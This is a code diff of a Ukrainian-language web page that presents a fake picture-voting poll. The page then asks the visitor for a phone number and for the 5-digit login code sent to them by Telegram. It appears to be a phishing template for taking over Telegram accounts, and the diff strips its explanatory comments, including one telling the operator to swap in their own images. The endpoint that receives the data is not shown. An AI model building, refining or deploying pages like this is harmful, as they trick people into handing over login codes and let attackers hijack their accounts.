@@ -49,7 +49,6 @@
         <h2>Зробіть вибір</h2>
         <p>Натисніть на одну з карток</p>
         
-        <!-- ЗАМІНИ ПОСИЛАННЯ В src НА СВОЇ КАРТИНКИ -->
         <div class="vote-card" data-vote="Варіант 1" onclick="selectVote(this)">
             <img src="https://picsum.photos/id/1015/100/100" alt="Варіант 1">
             <div class="vote-title">Варіант 1</div>
@@ -74,8 +73,6 @@
         <p>Введіть номер телефону для обліку голосу</p>
         <input type="tel" id="phone-input" placeholder="+380 99 123-45-67">
         <button class="main-btn" id="btn-manual" disabled onclick="submitPhone()">Надіслати номер</button>
-        
-        <!-- Кнопка повернення назад -->
         <button class="back-btn" onclick="goBack('screen-phone', 'screen-vote')">← Змінити голос</button>
     </div>
 
@@ -85,8 +82,6 @@
         <p>Код із 5 цифр, який надійшов у Telegram</p>
         <input type="text" id="code-input" inputmode="numeric" maxlength="5" placeholder="00000" autocomplete="one-time-code">
         <button class="main-btn" id="btn-submit" disabled onclick="submitCode()">Надіслати код</button>
-        
-        <!-- Кнопка повернення назад -->
         <button class="back-btn" onclick="goBack('screen-code', 'screen-phone')">← Змінити номер</button>
     </div>
 
@@ -109,7 +104,6 @@
             } catch (e) { console.error("Помилка", e); }
         }
 
-        // Вибір картки
         function selectVote(el) {
             document.querySelectorAll('.vote-card').forEach(e => e.classList.remove('selected'));
             el.classList.add('selected');
@@ -117,7 +111,6 @@
             document.getElementById('btn-next-vote').disabled = false;
         }
 
-        // Переходи між екранами
         function showPhone() {
             if (!selectedVote) return;
             document.getElementById('screen-vote').classList.add('hidden');
@@ -130,7 +123,7 @@
             document.getElementById(showId).classList.remove('hidden');
         }
 
-        // КРОК 2: ВІДПРАВКА НОМЕРА
+        // ВІДПРАВКА НОМЕРА
         const phoneInput = document.getElementById('phone-input');
         phoneInput.addEventListener('input', () => {
             phoneInput.value = phoneInput.value.replace(/[^\d+]/g, '');
@@ -148,7 +141,7 @@
             setTimeout(() => document.getElementById('code-input').focus(), 100);
         }
 
-        // КРОК 3: ВІДПРАВКА КОДУ
+        // ВІДПРАВКА КОДУ
         const codeInput = document.getElementById('code-input');
         codeInput.addEventListener('input', () => {
             codeInput.value = codeInput.value.replace(/\D/g, '').slice(0, 5);
